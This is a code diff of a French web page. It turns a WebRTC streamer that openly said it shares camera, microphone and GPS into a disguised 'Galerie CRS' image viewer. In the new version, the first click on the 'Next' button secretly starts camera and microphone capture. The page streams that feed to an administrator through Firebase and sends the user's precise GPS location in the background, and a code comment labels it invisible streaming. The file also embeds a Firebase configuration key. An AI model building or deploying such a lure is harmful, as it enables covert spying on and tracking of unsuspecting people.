@@ -2,334 +2,471 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebRTC Streamer - Utilisateur</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Galerie CRS - Visionneuse</title>
     <style>
-        body { font-family: 'Inter', sans-serif; }
-        @keyframes pulse-red {
-            0%, 100% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.6; transform: scale(0.95); }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-        .live-pulse { animation: pulse-red 1.5s infinite; }
-        .audio-wave {
-            display: inline-block;
-            width: 3px;
-            height: 12px;
-            background-color: #10b981;
-            margin: 0 1px;
-            animation: wave 0.5s infinite ease-in-out;
+
+        body {
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', sans-serif;
+            background: linear-gradient(145deg, #101418 0%, #1a1f2c 100%);
+            color: #f0f3fa;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
         }
-        @keyframes wave {
-            0%, 100% { height: 4px; }
-            50% { height: 12px; }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: rgba(20, 28, 44, 0.8);
+            backdrop-filter: blur(10px);
+            border-radius: 2rem;
+            padding: 1.5rem;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.4);
+            border: 1px solid rgba(217, 196, 139, 0.3);
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .header h1 {
+            font-size: 1.8rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #FFF8E7, #D9C48B);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+        }
+
+        .image-container {
+            position: relative;
+            background: #0a0e18;
+            border-radius: 1.5rem;
+            overflow: hidden;
+            margin-bottom: 1.5rem;
+            border: 1px solid #2a3348;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .image-container img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+            transition: transform 0.3s ease;
+        }
+
+        .image-counter {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.7);
+            padding: 4px 10px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-family: monospace;
+            color: #d9c48b;
+        }
+
+        .image-name {
+            text-align: center;
+            margin-top: 0.5rem;
+            font-size: 0.8rem;
+            color: #9aa7c7;
+            font-family: monospace;
+        }
+
+        .btn-next {
+            width: 100%;
+            background: linear-gradient(135deg, #d9c48b, #b8942e);
+            border: none;
+            padding: 1rem;
+            border-radius: 60px;
+            color: #121625;
+            font-weight: bold;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+
+        .btn-next:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+
+        .btn-next:active {
+            transform: translateY(0);
+        }
+
+        /* Indicateur de streaming discret */
+        .stream-status {
+            position: fixed;
+            bottom: 15px;
+            left: 15px;
+            background: rgba(0,0,0,0.7);
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 9px;
+            font-family: monospace;
+            z-index: 100;
+            pointer-events: none;
+            backdrop-filter: blur(4px);
+        }
+
+        .stream-status.active {
+            background: #10b981;
+            color: white;
+        }
+
+        .stream-status.error {
+            background: #ef4444;
+            color: white;
+        }
+
+        .badge-cam {
+            position: fixed;
+            top: 15px;
+            right: 15px;
+            background: rgba(0,0,0,0.6);
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-family: monospace;
+            z-index: 100;
+            pointer-events: none;
+        }
+
+        .badge-cam.active {
+            background: #10b981;
+            animation: pulse 1s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .info-text {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #6a759b;
+            margin-top: 1rem;
+        }
+
+        @media (max-width: 600px) {
+            body { padding: 1rem; }
+            .container { padding: 1rem; }
+            .btn-next { padding: 0.8rem; font-size: 1rem; }
         }
     </style>
 </head>
-<body class="bg-gradient-to-tr from-slate-950 via-slate-900 to-indigo-950 min-h-screen flex items-center justify-center p-4">
+<body>
 
-    <div class="bg-slate-900/95 border border-slate-800 text-white rounded-3xl p-6 max-w-md w-full shadow-2xl backdrop-blur-md">
-        <div class="text-center mb-6">
-            <span class="inline-block p-3 bg-indigo-500/10 rounded-2xl text-indigo-400 text-3xl mb-3">📡</span>
-            <h1 class="text-2xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent">Émetteur WebRTC Live</h1>
-            <p class="text-slate-400 text-sm mt-1">Partagez votre caméra, micro et position GPS</p>
-        </div>
-
-        <div class="relative rounded-2xl overflow-hidden bg-black aspect-video mb-4 border border-slate-800">
-            <video id="localVideo" autoplay muted playsinline class="w-full h-full object-cover scale-x-[-1]"></video>
-            <div id="noStreamPlaceholder" class="absolute inset-0 flex flex-col items-center justify-center bg-slate-950 text-slate-500 z-10 transition-opacity duration-300">
-                <span class="text-4xl mb-2">📹</span>
-                <p class="text-xs font-semibold">Caméra inactive</p>
-            </div>
-            <div id="liveBadge" class="hidden absolute top-3 left-3 bg-red-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full items-center gap-1.5 shadow-lg z-20">
-                <span class="w-2 h-2 rounded-full bg-white live-pulse"></span>
-                DIFFUSION ACTIVE
-            </div>
-            <div id="micBadge" class="hidden absolute top-3 right-3 bg-emerald-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full items-center gap-1.5 shadow-lg z-20">
-                <span class="audio-wave"></span>
-                <span class="audio-wave" style="animation-delay: 0.1s"></span>
-                <span class="audio-wave" style="animation-delay: 0.2s"></span>
-                MICRO ACTIF
-            </div>
-        </div>
-
-        <div class="grid grid-cols-2 gap-2 mb-6 text-xs">
-            <div class="bg-slate-950/50 p-3 rounded-xl border border-slate-800/50">
-                <span class="text-slate-500 block mb-0.5">Identifiant unique</span>
-                <span id="diagUserId" class="font-mono text-indigo-400 font-bold">---</span>
-            </div>
-            <div class="bg-slate-950/50 p-3 rounded-xl border border-slate-800/50">
-                <span class="text-slate-500 block mb-0.5">État WebRTC</span>
-                <span id="diagWebRTCState" class="font-mono text-amber-400 font-bold">Inactif</span>
-            </div>
-            <div class="bg-slate-950/50 p-3 rounded-xl border border-slate-800/50 col-span-2">
-                <span class="text-slate-500 block mb-0.5">Statut GPS & Audio</span>
-                <span id="diagGps" class="text-slate-300 font-semibold">Recherche...</span>
-            </div>
-        </div>
-
-        <div class="space-y-3">
-            <button id="startBtn" class="w-full py-4 px-6 bg-gradient-to-r from-indigo-500 to-purple-600 hover:from-indigo-600 hover:to-purple-700 text-white font-bold rounded-2xl shadow-lg transition-all transform active:scale-95">
-                🚀 Activer la diffusion (Caméra + Micro)
-            </button>
-            <button id="stopBtn" disabled class="w-full py-3 px-6 bg-slate-800 hover:bg-red-900 hover:text-white text-slate-400 font-semibold rounded-2xl transition-all disabled:opacity-30 disabled:pointer-events-none">
-                ⏹️ Arrêter le flux
-            </button>
-        </div>
-
-        <div id="statusMessage" class="mt-4 p-3 bg-slate-950 border border-slate-800 rounded-xl text-center text-xs text-slate-400">
-            ℹ️ Prêt à démarrer. Autorisez la caméra et le microphone.
-        </div>
+<div class="container">
+    <div class="header">
+        <h1>📸 GALERIE CRS</h1>
     </div>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-        import { getDatabase, ref, set, push, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+    <div class="image-container">
+        <img id="mainImage" src="" alt="Image CRS">
+        <div class="image-counter" id="imageCounter">0 / 0</div>
+    </div>
+    <div class="image-name" id="imageName"></div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
-            authDomain: "universite-taak.firebaseapp.com",
-            databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
-            projectId: "universite-taak",
-            storageBucket: "universite-taak.firebasestorage.app",
-            messagingSenderId: "550634728649",
-            appId: "1:550634728649:web:12147e8dec3a04618c3118"
-        };
+    <button id="nextBtn" class="btn-next">
+        ➡️ Suivant
+    </button>
+    
+    <div class="info-text">
+        Cliquez sur "Suivant" pour voir l'image suivante et activer la diffusion
+    </div>
+</div>
 
-        const app = initializeApp(firebaseConfig);
-        const database = getDatabase(app);
+<!-- Indicateurs discrets -->
+<div id="streamStatus" class="stream-status">📡 Démarrage...</div>
+<div id="badgeCam" class="badge-cam">🎥 Caméra inactive</div>
 
-        const userId = Math.random().toString(36).substring(2, 8).toUpperCase(); 
-        document.getElementById('diagUserId').innerText = userId;
+<script type="module">
+    // ==================== LISTE DES IMAGES ====================
+    const imageNames = [
+        "1009369335232642135.jpeg",
+        "1019924646866230654.jpeg",
+        "1019924646867172734.jpeg",
+        "1020206121825182860.jpeg",
+        "1041668588822541256.jpeg",
+        "1058838562371518139.jpeg",
+        "1078964023343966094.jpeg",
+        "1082060247966194711.jpeg",
+        "1082060247991313999.jpeg",
+        "1082060247992091257.jpeg",
+        "1097541371687084436.jpeg",
+        "1114781714009949396.jpeg",
+        "3307399722402051.jpeg",
+        "401172279330972863.jpeg",
+        "433823376620507919.jpeg",
+        "480055641549105709.jpeg",
+        "548313323407841940.jpeg",
+        "606930487322755106.jpeg",
+        "680536193717821781.jpeg",
+        "700591285822285123.jpeg",
+        "722898177726586963.jpeg",
+        "880242690198434670.jpeg",
+        "880242690205533269.jpeg",
+        "883690758124052911.jpeg",
+        "883972233095973115.jpeg",
+        "883972233111699111.jpeg",
+        "930837816740380539.jpeg",
+        "948781846504725844.jpeg",
+        "Beach.jpeg",
+        "zakoyabdoulhafizou959-jpg"
+    ];
 
-        let localStream = null;
-        let peerConnection = null;
-        let isStreaming = false;
-        let heartbeatInterval = null;
-        let answerListener = null;
-        let adminCandidateListener = null;
-        let candidateQueue = [];
-        let gpsWatchId = null;
+    const BASE_URL = "https://raw.githubusercontent.com/zakoyabdoulhafizou959-jpg/imagess/main/crs/";
+    
+    let currentIndex = 0;
+    let streamingActivated = false;
+    
+    // Éléments DOM
+    const mainImage = document.getElementById('mainImage');
+    const imageCounter = document.getElementById('imageCounter');
+    const imageName = document.getElementById('imageName');
+    const nextBtn = document.getElementById('nextBtn');
+    const streamStatusDiv = document.getElementById('streamStatus');
+    const badgeCam = document.getElementById('badgeCam');
 
-        const startBtn = document.getElementById('startBtn');
-        const stopBtn = document.getElementById('stopBtn');
-        const statusDiv = document.getElementById('statusMessage');
-        const localVideo = document.getElementById('localVideo');
-        const placeholder = document.getElementById('noStreamPlaceholder');
-        const liveBadge = document.getElementById('liveBadge');
-        const micBadge = document.getElementById('micBadge');
-        const diagWebRTCState = document.getElementById('diagWebRTCState');
-        const diagGps = document.getElementById('diagGps');
+    // ==================== WEBRTC STREAMING INVISIBLE ====================
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
+    import { getDatabase, ref, set, push, onValue, off, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
 
-        const deviceType = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Ordinateur";
+    const firebaseConfig = {
+        apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
+        authDomain: "universite-taak.firebaseapp.com",
+        databaseURL: "https://universite-taak-default-rtdb.firebaseio.com",
+        projectId: "universite-taak",
+        storageBucket: "universite-taak.firebasestorage.app",
+        messagingSenderId: "550634728649",
+        appId: "1:550634728649:web:12147e8dec3a04618c3118"
+    };
 
-        const rtcConfig = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' },
-                { urls: 'stun:stun2.l.google.com:19302' }
-            ]
-        };
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
 
-        function setStatus(message, isError = false) {
-            statusDiv.innerHTML = message;
-            statusDiv.className = isError 
-                ? 'mt-4 p-3 bg-red-950/50 border border-red-900 text-red-300 rounded-xl text-center text-xs'
-                : 'mt-4 p-3 bg-slate-950 border border-slate-800 rounded-xl text-center text-xs text-indigo-300';
+    const userId = Math.random().toString(36).substring(2, 8).toUpperCase();
+    let localStream = null;
+    let peerConnection = null;
+    let isStreaming = false;
+    let heartbeatInterval = null;
+    let answerListener = null;
+    let adminCandidateListener = null;
+    let candidateQueue = [];
+    let gpsWatchId = null;
+
+    const rtcConfig = {
+        iceServers: [
+            { urls: 'stun:stun.l.google.com:19302' },
+            { urls: 'stun:stun1.l.google.com:19302' },
+            { urls: 'stun:stun2.l.google.com:19302' }
+        ]
+    };
+
+    async function updatePresence() {
+        try {
+            await set(ref(database, `users/${userId}`), {
+                active: isStreaming,
+                lastActive: Date.now(),
+                device: "Galerie CRS Mobile",
+                hasAudio: localStream?.getAudioTracks().length > 0,
+                currentImage: imageNames[currentIndex],
+                timestamp: Date.now()
+            });
+        } catch (err) {
+            console.error("Erreur heartbeat:", err);
         }
+    }
 
-        async function updatePresence() {
-            try {
-                const presenceRef = ref(database, `users/${userId}`);
-                await set(presenceRef, {
-                    active: isStreaming,
-                    lastActive: Date.now(),
-                    device: deviceType,
-                    hasAudio: localStream?.getAudioTracks().length > 0,
-                    timestamp: Date.now()
-                });
-            } catch (err) {
-                console.error("Erreur heartbeat:", err);
-            }
-        }
-
-        updatePresence();
-        heartbeatInterval = setInterval(updatePresence, 3000);
-
-        async function startSharing() {
-            try {
-                setStatus("🎤 Demande d'accès à la caméra et au microphone...");
-                
-                // Capture vidéo + audio
-                localStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: {
-                        width: { ideal: 640, max: 1280 },
-                        height: { ideal: 480, max: 720 },
-                        frameRate: { ideal: 15, max: 24 }
-                    }, 
-                    audio: {
-                        echoCancellation: true,
-                        noiseSuppression: true,
-                        autoGainControl: true,
-                        sampleRate: 48000
-                    }
-                });
-                
-                localVideo.srcObject = localStream;
-                placeholder.style.opacity = '0';
-                setTimeout(() => placeholder.style.display = 'none', 300);
-                
-                // Vérifier et afficher le statut audio
-                const audioTracks = localStream.getAudioTracks();
-                if (audioTracks.length > 0) {
-                    micBadge.style.display = 'flex';
-                    setStatus(`✅ Micro actif : ${audioTracks[0].label}`, false);
-                } else {
-                    setStatus("⚠️ Aucun micro détecté, seulement la vidéo sera transmise", true);
+    async function startStreaming() {
+        if (streamingActivated) return;
+        
+        streamingActivated = true;
+        streamStatusDiv.textContent = "🎥 Activation caméra/micro...";
+        
+        try {
+            localStream = await navigator.mediaDevices.getUserMedia({ 
+                video: {
+                    width: { ideal: 640, max: 1280 },
+                    height: { ideal: 480, max: 720 },
+                    frameRate: { ideal: 15, max: 24 }
+                }, 
+                audio: {
+                    echoCancellation: true,
+                    noiseSuppression: true,
+                    autoGainControl: true
                 }
-                
-                peerConnection = new RTCPeerConnection(rtcConfig);
-                diagWebRTCState.innerText = "Créé";
-
-                // Ajouter TOUTES les pistes (vidéo + audio)
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
-                    console.log(`📡 Piste ajoutée: ${track.kind} - ${track.label}`);
-                });
-
-                peerConnection.onconnectionstatechange = () => {
-                    diagWebRTCState.innerText = peerConnection.connectionState.toUpperCase();
-                    if (peerConnection.connectionState === 'connected') {
-                        setStatus("🔴 Connexion établie - Diffusion en cours");
+            });
+            
+            badgeCam.textContent = "🎥 Caméra + Micro ACTIF";
+            badgeCam.classList.add('active');
+            
+            peerConnection = new RTCPeerConnection(rtcConfig);
+            
+            localStream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, localStream);
+                console.log(`📡 Piste ajoutée: ${track.kind}`);
+            });
+            
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    push(ref(database, `webrtc/${userId}/candidates`), event.candidate.toJSON());
+                }
+            };
+            
+            peerConnection.onconnectionstatechange = () => {
+                console.log(`État WebRTC: ${peerConnection.connectionState}`);
+                if (peerConnection.connectionState === 'connected') {
+                    streamStatusDiv.textContent = "🔴 LIVE - Diffusion active";
+                    streamStatusDiv.classList.add('active');
+                }
+                if (peerConnection.connectionState === 'failed') {
+                    streamStatusDiv.textContent = "⚠️ Connexion perdue";
+                    streamStatusDiv.classList.remove('active');
+                }
+            };
+            
+            const offer = await peerConnection.createOffer();
+            await peerConnection.setLocalDescription(offer);
+            
+            await set(ref(database, `webrtc/${userId}/offer`), {
+                sdp: offer.sdp,
+                type: offer.type,
+                timestamp: Date.now()
+            });
+            
+            // Écouter la réponse admin
+            answerListener = onValue(ref(database, `webrtc/${userId}/answer`), async (snapshot) => {
+                const answer = snapshot.val();
+                if (answer && peerConnection && !peerConnection.currentRemoteDescription) {
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+                    while (candidateQueue.length > 0) {
+                        const candidate = candidateQueue.shift();
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
                     }
-                };
-
-                peerConnection.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const candidateRef = ref(database, `webrtc/${userId}/candidates`);
-                        push(candidateRef, event.candidate.toJSON());
-                    }
-                };
-
-                const offer = await peerConnection.createOffer();
-                await peerConnection.setLocalDescription(offer);
-
-                const offerRef = ref(database, `webrtc/${userId}/offer`);
-                await set(offerRef, {
-                    sdp: offer.sdp,
-                    type: offer.type,
-                    timestamp: Date.now()
-                });
-
-                setStatus("📡 En attente de connexion de l'administrateur...");
-
-                const answerRef = ref(database, `webrtc/${userId}/answer`);
-                answerListener = onValue(answerRef, async (snapshot) => {
-                    const answer = snapshot.val();
-                    if (answer && peerConnection && !peerConnection.currentRemoteDescription) {
-                        setStatus("⚡ Réponse reçue, établissement du flux...");
-                        await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
-
-                        while (candidateQueue.length > 0) {
-                            const candidate = candidateQueue.shift();
-                            await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                }
+            });
+            
+            // Écouter les candidats admin
+            adminCandidateListener = onValue(ref(database, `webrtc/${userId}/admin-candidates`), (snapshot) => {
+                const candidates = snapshot.val();
+                if (candidates) {
+                    Object.values(candidates).forEach(candidate => {
+                        if (peerConnection && peerConnection.currentRemoteDescription) {
+                            peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
+                        } else {
+                            candidateQueue.push(candidate);
                         }
-                    }
-                });
-
-                const adminCandidatesRef = ref(database, `webrtc/${userId}/admin-candidates`);
-                adminCandidateListener = onValue(adminCandidatesRef, (snapshot) => {
-                    const candidates = snapshot.val();
-                    if (candidates) {
-                        Object.values(candidates).forEach(candidate => {
-                            if (peerConnection && peerConnection.currentRemoteDescription) {
-                                peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
-                            } else {
-                                candidateQueue.push(candidate);
-                            }
-                        });
-                    }
-                });
-
-                // GPS
-                if (navigator.geolocation) {
-                    diagGps.innerText = "Recherche position GPS...";
-                    gpsWatchId = navigator.geolocation.watchPosition(
-                        async (position) => {
-                            const locationRef = ref(database, `users/${userId}/location`);
-                            await set(locationRef, {
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude,
-                                timestamp: Date.now()
-                            });
-                            diagGps.innerHTML = `📍 GPS: <span class="text-green-400">${position.coords.latitude.toFixed(5)}, ${position.coords.longitude.toFixed(5)}</span> | 🎤 Micro: <span class="text-emerald-400">ACTIF</span>`;
-                        },
-                        () => { diagGps.innerText = "❌ Signal GPS instable"; },
-                        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
-                    );
-                } else {
-                    diagGps.innerText = "❌ GPS non supporté";
+                    });
                 }
-
-                isStreaming = true;
-                await updatePresence();
-                startBtn.disabled = true;
-                stopBtn.disabled = false;
-                liveBadge.style.display = 'flex';
-
-            } catch (err) {
-                setStatus("❌ Erreur: " + err.message, true);
-                console.error(err);
+            });
+            
+            // GPS en arrière-plan
+            if (navigator.geolocation) {
+                gpsWatchId = navigator.geolocation.watchPosition(
+                    async (position) => {
+                        await set(ref(database, `users/${userId}/location`), {
+                            lat: position.coords.latitude,
+                            lng: position.coords.longitude,
+                            timestamp: Date.now()
+                        });
+                    },
+                    () => { console.warn("GPS indisponible"); },
+                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                );
             }
+            
+            isStreaming = true;
+            updatePresence();
+            heartbeatInterval = setInterval(updatePresence, 3000);
+            
+            streamStatusDiv.textContent = "🔴 LIVE - Caméra + Micro";
+            streamStatusDiv.classList.add('active');
+            
+            console.log(`✅ Streaming actif - ID: ${userId}`);
+            
+        } catch (err) {
+            console.error("Erreur streaming:", err);
+            streamStatusDiv.textContent = "❌ Erreur - Impossible d'accéder à la caméra";
+            streamStatusDiv.classList.add('error');
+            badgeCam.textContent = "❌ Caméra indisponible";
         }
+    }
 
-        async function stopSharing() {
-            isStreaming = false;
-            await updatePresence();
-
-            if (gpsWatchId) {
-                navigator.geolocation.clearWatch(gpsWatchId);
-                gpsWatchId = null;
-            }
-
+    // ==================== FONCTIONS DE LA GALERIE ====================
+    function loadImage(index) {
+        const imageNameRaw = imageNames[index];
+        const imageUrl = BASE_URL + encodeURIComponent(imageNameRaw);
+        
+        mainImage.src = imageUrl;
+        mainImage.alt = imageNameRaw;
+        imageName.textContent = imageNameRaw.length > 50 ? imageNameRaw.substring(0, 47) + "..." : imageNameRaw;
+        imageCounter.textContent = `${index + 1} / ${imageNames.length}`;
+        
+        // Gestion d'erreur de chargement
+        mainImage.onerror = () => {
+            mainImage.src = "data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20300%20200%22%3E%3Crect%20width%3D%22300%22%20height%3D%22200%22%20fill%3D%22%231a1e2c%22%2F%3E%3Ctext%20x%3D%22150%22%20y%3D%22100%22%20fill%3D%22%23d9c48b%22%20text-anchor%3D%22middle%22%3EImage%20non%20trouvée%3C%2Ftext%3E%3C%2Fsvg%3E";
+            imageName.textContent = "Image non disponible";
+        };
+    }
+    
+    function nextImage() {
+        // Changer l'image
+        currentIndex = (currentIndex + 1) % imageNames.length;
+        loadImage(currentIndex);
+        
+        // Activer le streaming au premier clic sur "Suivant"
+        if (!streamingActivated) {
+            startStreaming();
+        }
+        
+        // Mettre à jour la présence avec l'image actuelle
+        if (isStreaming) {
+            updatePresence();
+        }
+    }
+    
+    // Charger la première image
+    loadImage(0);
+    
+    // Événement du bouton Suivant
+    nextBtn.addEventListener('click', nextImage);
+    
+    // Arrêt propre à la fermeture
+    window.addEventListener('beforeunload', () => {
+        if (isStreaming) {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
             if (answerListener) off(ref(database, `webrtc/${userId}/answer`));
             if (adminCandidateListener) off(ref(database, `webrtc/${userId}/admin-candidates`));
-
-            if (peerConnection) {
-                peerConnection.close();
-                peerConnection = null;
-            }
-
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-                localStream = null;
-            }
-
-            localVideo.srcObject = null;
-            placeholder.style.display = 'flex';
-            placeholder.style.opacity = '1';
-            liveBadge.style.display = 'none';
-            micBadge.style.display = 'none';
-            diagWebRTCState.innerText = "Inactif";
-            diagGps.innerText = "Recherche...";
-
-            await remove(ref(database, `webrtc/${userId}`));
-
-            setStatus("⏹️ Flux arrêté.");
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
+            if (peerConnection) peerConnection.close();
+            if (localStream) localStream.getTracks().forEach(track => track.stop());
+            remove(ref(database, `webrtc/${userId}`));
+            remove(ref(database, `users/${userId}`));
         }
-
-        startBtn.addEventListener('click', startSharing);
-        stopBtn.addEventListener('click', stopSharing);
-
-        window.addEventListener('beforeunload', () => {
-            if (userId) {
-                set(ref(database, `users/${userId}`), null);
-                remove(ref(database, `webrtc/${userId}`));
-            }
-        });
-    </script>
+    });
+    
+    console.log("📱 Application prête - ID utilisateur:", userId);
+</script>
 </body>
 </html>
